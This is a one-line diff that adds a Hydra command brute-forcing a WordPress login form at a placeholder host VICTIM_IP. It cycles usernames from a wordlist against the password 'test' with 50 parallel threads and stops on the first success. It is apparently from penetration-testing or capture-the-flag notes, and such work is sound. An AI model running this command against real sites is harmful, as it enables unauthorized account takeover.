@@ -1,0 +1,1 @@
+hydra VICTIM_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -f -t 50 -p test -L user-wordlist.txt
